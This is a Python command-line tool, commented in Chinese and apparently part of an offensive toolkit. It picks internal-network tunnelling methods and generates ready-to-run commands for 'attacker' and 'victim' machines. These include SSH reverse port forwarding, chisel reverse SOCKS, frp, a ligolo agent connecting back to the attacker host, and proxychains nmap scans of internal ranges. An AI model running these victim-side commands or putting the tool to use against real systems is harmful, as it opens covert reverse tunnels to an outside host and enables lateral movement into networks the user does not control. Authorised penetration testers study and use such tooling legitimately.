#!/usr/bin/env python3
"""内网隧道选型与命令生成（不主动连外网）。

示例:
  python3 tools/tunnel-kit/tunnel_plan.py doctor
  python3 tools/tunnel-kit/tunnel_plan.py recommend --have shell --egress http
  python3 tools/tunnel-kit/tunnel_plan.py emit --kind chisel --attacker 1.2.3.4 --case <案卷>
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
from datetime import datetime, timezone
from pathlib import Path

def _kit_ops_dir(start: Path) -> Path:
    here = start.resolve()
    if here.is_file():
        here = here.parent
    for p in (here, *here.parents):
        fang = p / "炼蛊房"
        if (fang / "scope_lib.py").is_file():
            return fang
        ops = p / "tools" / "ops"
        if (ops / "scope_lib.py").is_file():
            return ops
    return here

ENGINE = Path(__file__).resolve().parents[2]
KIT = Path(__file__).resolve().parent
ARSENAL_BIN = ENGINE / "tools" / "arsenal" / "bin"
TEMPLATES = KIT / "templates"


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = (ENGINE / "案卷" if (ENGINE / "案卷").is_dir() else ENGINE / "exports" / "bot-recovery") / case / "测绘" / "tunnel"
    d.mkdir(parents=True, exist_ok=True)
    return d


def which_tool(name: str) -> str | None:
    for p in (ARSENAL_BIN / name, Path(shutil.which(name) or "")):
        if p and Path(p).is_file() and os.access(p, os.X_OK):
            return str(p)
    return None


MATRIX = [
    {
        "kind": "ssh_reverse",
        "when": "有交互 shell + 出站 SSH(22/443) 可达攻击机",
        "pros": "零依赖、审计友好",
        "cons": "需 sshd 在攻击机开 GatewayPorts/授权密钥",
    },
    {
        "kind": "chisel",
        "when": "有 shell + 出站 HTTP(S) ；要反向 SOCKS",
        "pros": "单二进制、易过代理",
        "cons": "需先装到 arsenal/bin",
    },
    {
        "kind": "frp",
        "when": "要稳定多端口映射 / 长期跳板",
        "pros": "配置清晰、多 proxy",
        "cons": "组件多、指纹明显",
    },
    {
        "kind": "ligolo",
        "when": "要整段网段路由级访问（真内网漫游）",
        "pros": "体验接近 VPN",
        "cons": "需 tun 权限与路由",
    },
    {
        "kind": "socks_chain",
        "when": "已有 SOCKS，只需本机挂 proxychains/curl --socks5",
        "pros": "最快验证",
        "cons": "不解决建立隧道本身",
    },
]


def cmd_doctor(_: argparse.Namespace) -> int:
    for name in ("chisel", "frpc", "frps", "ligolo-proxy", "proxychains4", "ssh"):
        p = which_tool(name)
        print(f"[{'ok' if p else 'missing'}] {name}: {p or '-'}")
    print(f"[templates] {TEMPLATES}")
    print("[hint] bash tools/tunnel-kit/install_tunnels.sh")
    return 0


def cmd_recommend(args: argparse.Namespace) -> int:
    have = set((args.have or "").lower().replace(",", " ").split())
    egress = (args.egress or "any").lower()
    picks = []
    for row in MATRIX:
        score = 0
        if "shell" in have and row["kind"] in ("ssh_reverse", "chisel", "frp", "ligolo"):
            score += 2
        if egress in ("http", "https", "any") and row["kind"] == "chisel":
            score += 2
        if egress in ("ssh", "any") and row["kind"] == "ssh_reverse":
            score += 2
        if "route" in have and row["kind"] == "ligolo":
            score += 3
        if "socks" in have and row["kind"] == "socks_chain":
            score += 3
        if score:
            picks.append({**row, "score": score})
    picks.sort(key=lambda x: -x["score"])
    if not picks:
        picks = MATRIX[:3]
    print(json.dumps({"have": sorted(have), "egress": egress, "picks": picks}, ensure_ascii=False, indent=2))
    return 0


def emit_plan(kind: str, attacker: str, port: int) -> dict:
    chisel = which_tool("chisel") or "chisel"
    ssh_tpl = str(TEMPLATES / "ssh_reverse.sh")
    if kind == "ssh_reverse":
        return {
            "kind": kind,
            "attacker": [
                "# 攻击机 sshd: GatewayPorts clientspecified；授权受害机密钥",
                "# 受害机执行（将模板传到受害机后运行）:",
                f"REMOTE_HOST={attacker} REMOTE_PORT={port} bash ssh_reverse.sh",
            ],
            "victim": [f"ssh -N -o ServerAliveInterval=30 -R {port}:127.0.0.1:22 user@{attacker}"],
            "verify": [f"ssh -p {port} user@127.0.0.1  # 在攻击机"],
            "template": ssh_tpl,
        }
    if kind == "chisel":
        return {
            "kind": kind,
            "attacker": [f"{chisel} server -p {port} --reverse"],
            "victim": [f"{chisel} client http://{attacker}:{port} R:socks"],
            "verify": ["curl -x socks5h://127.0.0.1:1080 http://内网目标/"],
            "template": str(TEMPLATES / "chisel_reverse.sh"),
        }
    if kind == "frp":
        return {
            "kind": kind,
            "attacker": [f"frps -c frps.toml  # bindPort={port}"],
            "victim": ["frpc -c frpc_example.toml  # 改 serverAddr/token"],
            "verify": ["curl -x socks5h://127.0.0.1:1080 http://内网目标/"],
            "template": str(TEMPLATES / "frpc_example.toml"),
        }
    if kind == "ligolo":
        return {
            "kind": kind,
            "attacker": ["ligolo-proxy -selfcert", "# session → ifconfig → start → 加路由"],
            "victim": [f"agent -connect {attacker}:11601 -ignore-cert"],
            "verify": ["ping/curl 内网网段"],
            "template": str(TEMPLATES / "ligolo_notes.md"),
        }
    if kind == "socks_chain":
        return {
            "kind": kind,
            "attacker": ["# 已有 SOCKS 时"],
            "victim": [],
            "verify": [
                "curl -x socks5h://127.0.0.1:1080 https://ifconfig.me",
                "proxychains4 nmap -sT -Pn 内网段",
            ],
        }
    raise SystemExit(f"[err] 未知 kind: {kind}")


def cmd_emit(args: argparse.Namespace) -> int:
    plan = emit_plan(args.kind, args.attacker, args.port)
    plan["ts"] = _now()
    if args.case:
        out = case_dir(args.case) / f"plan_{args.kind}.json"
        out.write_text(json.dumps(plan, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        plan["evidence"] = str(out)
    print(json.dumps(plan, ensure_ascii=False, indent=2))
    return 0


def main() -> int:
    p = argparse.ArgumentParser(description="内网隧道选型")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor")
    d.set_defaults(func=cmd_doctor)

    r = sub.add_parser("recommend")
    r.add_argument("--have", default="shell", help="shell,socks,route 逗号分隔")
    r.add_argument("--egress", default="any", help="http|ssh|any")
    r.set_defaults(func=cmd_recommend)

    e = sub.add_parser("emit")
    e.add_argument("--kind", required=True, choices=[m["kind"] for m in MATRIX])
    e.add_argument("--attacker", required=True, help="攻击机 IP/域名")
    e.add_argument("--port", type=int, default=8080)
    e.add_argument("--case")
    e.set_defaults(func=cmd_emit)

    args = p.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
